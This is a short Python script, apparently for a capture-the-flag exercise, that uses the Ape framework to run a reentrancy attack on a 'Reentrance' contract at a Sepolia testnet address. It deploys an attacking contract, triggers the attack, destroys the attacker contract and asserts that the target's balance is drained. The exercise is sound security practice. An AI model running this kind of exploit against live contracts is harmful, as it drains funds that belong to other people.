#!/usr/bin/python3
from ape import accounts, convert, project
from rich.console import Console

# sepolia: 0x35eA0009d677FB59FE7b17957470Ec8356dA5a4a
ADDRESS = "0x35eA0009d677FB59FE7b17957470Ec8356dA5a4a"

console = Console()


def attack():
    attacker = accounts.load("ctf")
    attacker.set_autosign(True)
    target_contract = project.Reentrance.at(ADDRESS)

    console.print(f"[green]Balance Before The Hack: [magenta]{target_contract.balance}")
    console.print(f"[green]Balance of the attacker Before The Hack: [magenta]{attacker.balance}")
    console.print("[red]Attacking Now...")
    
    amount: int = convert("0.001 eth", int)
    attacking_contract = project.Attack.deploy(ADDRESS, amount, value=amount, sender=attacker)
    attacking_contract.donateToTarget(sender=attacker)
    attacking_contract.attack(sender=attacker)
    attacking_contract.destroy(sender=attacker)

    console.print(f"[green]Balance After The Hack: [magenta]{target_contract.balance}")
    console.print(f"[green]Balance of the attacker After The Hack: [magenta]{attacker.balance}")

    assert target_contract.balance == 0



def main():
    attack()


if __name__ == "__main__":
    main()
